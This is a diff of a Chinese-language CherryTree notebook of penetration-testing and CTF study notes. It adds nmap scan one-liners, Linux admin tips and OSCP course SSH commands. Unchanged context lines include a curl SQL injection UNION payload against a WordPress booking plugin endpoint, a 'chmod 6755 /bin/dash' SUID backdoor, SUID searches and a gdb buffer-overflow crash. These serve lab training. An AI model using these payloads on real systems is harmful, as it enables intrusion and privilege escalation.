@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1678174176">
+  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1678429769">
     <rich_text scale="h3" weight="heavy">需要安装的脚本工具：</rich_text>
     <rich_text>
 
@@ -108,9 +108,20 @@ kernel:
     <rich_text scale="h3" weight="heavy">hack 步骤及常用操作</rich_text>
     <rich_text>
 
-• ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
-nmap -sC -sV -p $ports 10.10.11.186 -Pn
+• </rich_text>
+    <rich_text weight="heavy">ports=$(nmap -p- --min-rate=1000 -T4 192.168.219.52 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
+nmap -sC -sV -p $ports 192.168.219.52 -Pn</rich_text>
+    <rich_text>
 扫描主机开放端口
+这里是该命令中使用的各个标志和选项的说明：
+
+"-sC": 在目标主机上运行默认的NSE脚本。此选项等同于"--script=default"。
+"-sV": 启用版本检测，尝试确定每个打开端口上运行的服务。此选项等同于"--version-all"。
+"-sU": 启用UDP扫描。默认情况下，Nmap仅扫描TCP端口。
+"-p ports": 指定要扫描的端口范围或列表。在本例中，"ports":指定要扫描的端口范围或列表。在本例中，"ports"是需要在脚本或命令行中的其他地方定义的变量。
+"10.10.101.106": 这是正在扫描的目标的IP地址。
+"-Pn": 告诉Nmap在尝试扫描端口之前不要进行ping扫描。如果没有此选项，Nmap将首先尝试ping目标，并仅扫描响应ICMP回显请求的主机的端口。
+
 
 • 通过 ip 地址无法访问站点，尝试编辑 /etc/hosts 文件，添加 &lt;ip&gt; &lt;machine&gt;.htb 到文件中
 
@@ -279,7 +290,7 @@ msfvenom -l payloads 列出所有 payloads
 • Payloads 页面 Payloads options 中选择密码字典文件
 • 点击右上角 start attack 开始进行爆破
 • 点击 length 列排序，找到返回长度不同的那个请求观察结果</rich_text>
-    <codebox char_offset="5001" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
+    <codebox char_offset="5368" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 
 int main(int argc, char** argv) {
@@ -289,7 +300,7 @@ int main(int argc, char** argv) {
         return 0;
 }
 </codebox>
-    <codebox char_offset="5146" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
+    <codebox char_offset="5513" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
 Dump of assembler code for function main:
    0x0000000000001139 &lt;+0&gt;:     push   %rbp
    0x000000000000113a &lt;+1&gt;:     mov    %rsp,%rbp
@@ -307,7 +318,7 @@ Dump of assembler code for function main:
    0x0000000000001176 &lt;+61&gt;:    leave  
    0x0000000000001177 &lt;+62&gt;:    ret    
 End of assembler dump.</codebox>
-    <codebox char_offset="5276" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
+    <codebox char_offset="5643" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
 Program received signal SIGSEGV, Segmentation fault.
 0x0000414141414141 in ?? ()
 (gdb) info registers	(查看寄存器信息)
@@ -337,7 +348,7 @@ fs             0x0                 0
 gs             0x0                 0
 </codebox>
   </node>
-  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678198107">
+  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678417700">
     <rich_text>1. 生成 rsa private key 并解密加密的文件
 ./RsaCtfTool.py --publickey ~/Weak_RSA/key.pub --uncipherfile ~/Weak_RSA/flag.enc --attack wiener --private
 
@@ -438,6 +449,7 @@ vw 删除从光标开始到单词词尾
 chmod 6755 /bin/dash
 
 10. ps -aux 查看系统运行的服务
+ps -e 只看服务的进程 id 和名称
 
 11. find / -perm -4000 2&gt;/dev/null (查找所有 suid 文件)
 
@@ -506,7 +518,7 @@ G=	指不进行预先cookie请求，如果不加G= （后有个空格），每�
 curl 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=d0a365ea46&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' </rich_text>
     <rich_text weight="heavy">--proxy "http://127.0.0.1:8080"</rich_text>
   </node>
-  <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1677641160">
+  <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1678419869">
     <rich_text weight="heavy">Linux 最基本的操作</rich_text>
     <rich_text>
 如果当你有什么命令不懂的时候 用以下命令 可以帮你解决很多疑惑
@@ -762,7 +774,21 @@ ssh 无法登录，提示KexAlgorithms等不支持之类的同样修改该文件
 </rich_text>
     <rich_text weight="heavy">设置时区，同步时间</rich_text>
     <rich_text>
-dpkg-reconfigure tzdata     选择 asia-》shanghai</rich_text>
+dpkg-reconfigure tzdata     选择 asia-》shanghai
+
+</rich_text>
+    <rich_text weight="heavy">root 默认密码</rich_text>
+    <rich_text>
+系统安装完，root 用户默认被锁定没有设置密码，通常建议用户使用sudo命令执行管理员任务。
+此时无法直接通过 su - 且到 root 用户，但可通过 sudo passwd root 给 root 设置一个密码，然后就可以通过 su - 用新设置的密码切到 root 用户。
+
+</rich_text>
+    <rich_text weight="heavy">查看系统端口的占用情况</rich_text>
+    <rich_text>
+netstat -tunlp
+其中，-t 选项表示显示 TCP 协议的连接，-u 选项表示显示 UDP 协议的连接，-n 表示以数字形式显示地址和端口号，-l 表示仅显示监听状态的连接，-p 表示显示进程 PID 和名称。此命令输出结果中，Local Address 列即为本地开放的端口。
+注意如果一个端口只绑定在 127.0.0.1 这个地址上，那么只有本机的应用程序可以通过 127.0.0.1 地址来访问该端口，同一个局域网中的其他机器是无法访问的。这是因为 127.0.0.1 地址是一个特殊的地址，仅限于本机使用，不会通过网络传输数据包。
+如果要使同一局域网内的其他机器能够访问该端口，需要将其绑定在与其他机器共享的 IP 地址上，例如本机所在的局域网 IP 地址或者公网 IP 地址（如0.0.0.0:&lt;port&gt;），这样其他机器就可以通过该 IP 地址来访问该端口。</rich_text>
   </node>
   <node name="windows" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675320818" ts_lastsave="1675430727">
     <rich_text weight="heavy">1. </rich_text>
@@ -787,7 +813,7 @@ netstat -ano | find "LISTEN"     cmd 终端下查看当前电脑端口使用情�
     <rich_text>
  tasklist ，相当于任务管理器查看本机运行了那些应用</rich_text>
   </node>
-  <node name="oscp_course" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653915363" ts_lastsave="1677120064">
+  <node name="oscp_course" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653915363" ts_lastsave="1678673523">
     <rich_text scale="h3">2.2 Conmmand Line</rich_text>
     <rich_text>
 updatedb (先更新数据库) locate (查找对应文件位置)
@@ -811,7 +837,16 @@ updatedb (先更新数据库) locate (查找对应文件位置)
 </rich_text>
     <rich_text scale="h3">5.1 Installing Kioptrix Level 1 </rich_text>
     <rich_text>
-netdiscover -i eth0 扫描当前网关中有那些设备</rich_text>
+netdiscover -i eth0 扫描当前网关中有那些设备
+
+
+</rich_text>
+    <rich_text weight="heavy">KALI:</rich_text>
+    <rich_text>
+
+• 作为附加说明，主题练习的实现方式允许我们多次使用相同的远程 IP 和端口。在需要 SSH 连接的主题练习虚拟机上，我们建议发出带有几个额外选项的 SSH 命令，如下所示：
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" student@192.168.50.52 -p 2222
+</rich_text>
   </node>
   <node name="bashed" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649505250" ts_lastsave="1649663614">
     <node name="nmap" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649505696" ts_lastsave="1649664357">
